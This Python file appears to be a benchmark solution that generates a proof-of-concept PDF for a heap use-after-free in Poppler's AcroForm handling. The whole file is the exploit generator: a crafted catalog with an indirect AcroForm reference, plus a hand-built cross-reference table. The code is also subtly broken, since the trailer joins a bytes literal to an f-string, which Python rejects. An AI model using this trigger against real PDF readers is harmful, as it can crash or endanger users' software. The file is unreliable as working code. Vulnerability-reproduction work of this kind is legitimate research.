import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Poppler.
        
        The vulnerability exists in Form::Form where passing the AcroForm Dict to Object() 
        does not increase the reference count, but the Object destructor decreases it.
        This leads to the AcroForm dictionary being freed while still referenced by the Catalog 
        or other objects, causing a UAF or Double Free.
        
        The PoC is a minimal PDF with a Catalog containing an indirect reference to an AcroForm dictionary.
        """
        
        # PDF Header with binary marker
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        
        # Object 1: Catalog
        # Defines the Root of the document. References Pages and the vulnerable AcroForm.
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>\nendobj\n"
        
        # Object 2: Pages
        # Standard Pages tree root.
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # A single empty page.
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # Object 4: AcroForm
        # This is the trigger. It must be a dictionary.
        # The content doesn't strictly matter for the UAF logic, but /Fields is standard.
        obj4 = b"4 0 obj\n<< /Fields [] >>\nendobj\n"
        
        body = obj1 + obj2 + obj3 + obj4
        
        # Calculate offsets for Cross-Reference Table
        off1 = len(header)
        off2 = off1 + len(obj1)
        off3 = off2 + len(obj2)
        off4 = off3 + len(obj3)
        xref_offset = len(header) + len(body)
        
        # Construct XRef Table
        # Entries must be exactly 20 bytes: "nnnnnnnnnn ggggg n \n"
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        xref += f"{off1:010} 00000 n \n".encode("ascii")
        xref += f"{off2:010} 00000 n \n".encode("ascii")
        xref += f"{off3:010} 00000 n \n".encode("ascii")
        xref += f"{off4:010} 00000 n \n".encode("ascii")
        
        # Trailer
        trailer = (
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
            f"{xref_offset}\n".encode("ascii")
            b"%%EOF\n"
        )
        
        return header + body + xref + trailer
